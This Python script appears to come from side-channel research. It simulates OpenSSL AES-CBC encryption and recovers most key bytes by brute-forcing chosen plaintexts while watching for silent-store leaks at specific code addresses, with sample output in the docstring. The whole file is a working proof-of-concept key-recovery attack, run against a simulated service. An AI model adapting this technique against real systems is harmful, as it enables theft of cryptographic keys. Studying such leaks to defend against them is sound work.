#!/usr/bin/env python3
"""
david.mateos@hestia:~$ ./src/attack_aes_enc_ssi.py
Real key: 28 15 6f bf 49 f6 aa 08 29 cf 49 18 6b ba f7 16

[0] starting
[0] 0.00% (0/65536)
[0] 1.53% (1000/65536)
...
[0] 9.16% (6000/65536)
[0] found one: ?? f5 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 5c ?? ??
[1] starting
[1] bad: lost prev ss
[0] resuming..
[0] 10.68% (7000/65536)
[0] 13.73% (9000/65536)
[0] found one: ?? 82 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 60 ?? ??
[1] starting
[1] bad: lost prev ss
[0] resuming..
[0] 15.26% (10000/65536)
...
[0] 99.18% (65000/65536)
[0] found one: ?? 15 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ba ?? ??
[1] starting
[1] found one: ?? 15 ?? ?? ?? f6 ?? ?? ?? ?? ?? ?? ?? ba ?? ??
[2] starting
[2] found one: ?? 15 ?? ?? ?? f6 ?? ?? ?? cf ?? ?? ?? ba ?? ??
[3] starting
[3] 0.00% (0/65536)
[3] 1.53% (1000/65536)
...
[3] 59.51% (39000/65536)
[3] found one: ?? 15 1d ?? ?? f6 ?? ?? ?? cf e9 ?? ?? ba ?? ??
[4] starting
[4] 0.00% (0/65536)
...
[4] 97.66% (64000/65536)
[4] 99.18% (65000/65536)
[4] bad: exhausted
[3] resuming..
[3] 61.04% (40000/65536)
...
[3] 90.03% (59000/65536)
[3] found one: ?? 15 6f ?? ?? f6 ?? ?? ?? cf 49 ?? ?? ba ?? ??
[4] starting
...
[4] found one: ?? 15 6f ?? ?? f6 aa ?? ?? cf 49 ?? ?? ba f7 ??
[5] starting
[5] found one: ?? 15 6f bf ?? f6 aa ?? ?? cf 49 ?? ?? ba f7 16
[6] starting
[6] found one: ?? 15 6f bf ?? f6 aa ?? ?? cf 49 18 ?? ba f7 16
[7] starting
[7] found one: ?? 15 6f bf ?? f6 aa 08 ?? cf 49 18 ?? ba f7 16

Recovered key: ?? 15 6f bf ?? f6 aa 08 ?? cf 49 18 ?? ba f7 16
Original key:  28 15 6f bf 49 f6 aa 08 29 cf 49 18 6b ba f7 16

Time: 50.69m

"""
import time
import random
import itertools
from attack_common import xor, xor_byte, hexspaces_known_pos, hexspaces, check_correct_file
from model import SilentStoreInitializedMemTracer, X86UnicornModel
from input_generator import AESEncryptInputGenerator, Input
from interfaces import RawTrace

MSG_LENGTH = 16
KEY_LENGTH = AESEncryptInputGenerator.KEYBYTES
IV_LENGTH = AESEncryptInputGenerator.AES_BLOCK_SIZE

class Service:
	"""
	This models a service that encrypts some message with AES_cbc_encrypt using
	a secret key and constant IV. It assumes the attacker can encrypt an arbitrary
	message, observe silent stores when the stored value is 0, and get the traces
	of the PCs where those silent stores happened, using trace(). The attacker's
	goal is to leak the secret key.
	"""

	def __init__(self):
		self.iv = random.randbytes(IV_LENGTH)
		self.key = random.randbytes(KEY_LENGTH)

		self.model = X86UnicornModel("targets/openssl", "aes_enc")
		self.model.tracer = SilentStoreInitializedMemTracer([0])
		self.input_gen = AESEncryptInputGenerator(self.model.STACK, self.model.STACK_SIZE)

	def trace(self, message: bytes) -> RawTrace:
		input_ = self.input_gen.create_input(message, self.key, self.iv)
		trace, _ = self.model.trace_test_case(input_)
		return trace.trace

INVSUB0 = 0x52

def do_xors(msg, iv):
	return xor(xor_byte(msg, INVSUB0), iv)

def set_values(msg, indexes, bs):
	for idx, b in zip(indexes, bs):
		msg[idx] = b

def hexspaces_missing_bytes(s, i):
	known = []
	for indexes, _ in info[:i+1]:
		known += indexes
	return hexspaces_known_pos(s, known)

cache = {}
def trace_count(msg, pc, service):
	msg = bytes(msg)
	if msg not in cache:
		trace = service.trace(msg)
		pcs = [int(observation, 16) for observation in trace]
		cache[msg] = pcs
	return cache[msg].count(pc)

# Pairs of leaked positions of the key and PC where the SS happens
info = [
	# First 4
	([0xd, 0x1], 0x402990),
	([0x5], 0x402997),
	([0x9], 0x40299f),

	# Next 2
	([0x2, 0xa], 0x4029b4),

	# Next 2
	([0x6, 0xe], 0x4029ad),

	# Final 4
	([0x3, 0xf], 0x4029ca),
	([0xb], 0x4029d4),
	([0x7], 0x4029d1)
]

def bruteforce_key_i(msg, i, service):
	indexes, pc = info[i]
	n = len(indexes)
	total_its = 0x100**n
	print(f"[{i}] starting")
	for it, bs in enumerate(itertools.product(range(0x100), repeat=n)):
		# Set bytes to our msg
		for idx, b in zip(indexes, bs):
			msg[idx] = b

		# Make sure we didn't lose any of the previous silent stores
		for _, pc_prev in info[:i]:
			if trace_count(msg, pc_prev, service) == 0:
				print(f"[{i}] bad: lost prev ss")
				return None

		# Check if we found current silent store
		if trace_count(msg, pc, service) > 0:
			print(f"[{i}] found one: {hexspaces_missing_bytes(do_xors(msg, service.iv), i)}")
			yield msg
			print(f"[{i}] resuming..")

		# Print some stats
		if n > 1 and it % 1000 == 0:
			perc = 100*it/total_its
			print(f"[{i}] {perc:.2f}% ({it}/{total_its})")

	# We exhausted all possible options
	print(f"[{i}] bad: exhausted")
	return None

def bruteforce_key_all(service, msg=bytearray(b"A"*MSG_LENGTH), i=0):
	# Explore the tree using depth-first, until one of the options gets to the bottom
	for msg in bruteforce_key_i(msg.copy(), i, service):
		if i == len(info)-1:
			return do_xors(msg, service.iv)
		ret = bruteforce_key_all(service, msg.copy(), i+1)
		if ret is not None:
			return ret
	return None

def main():
	check_correct_file("targets/openssl")
	service = Service()

	# Print real key
	print(f"Real key: {hexspaces(service.key)}\n")

	# Bruteforce key
	time_start = time.time()
	key = bruteforce_key_all(service)
	print()
	print(f"Recovered key: {hexspaces_missing_bytes(key, len(info))}")
	print(f"Original key:  {hexspaces(service.key)}")
	time_end = time.time()

	print(f"\nTime: {(time_end-time_start)/60:.2f}m")

	# Bruteforcing the 4 missing bytes of the original key is possible, but has
	# not implemented because this scenario of a constant IV is not realistic.
	# For a more realistic one, take a look at attack_aes_dec_ssi.py.


if __name__ == "__main__":
	main()
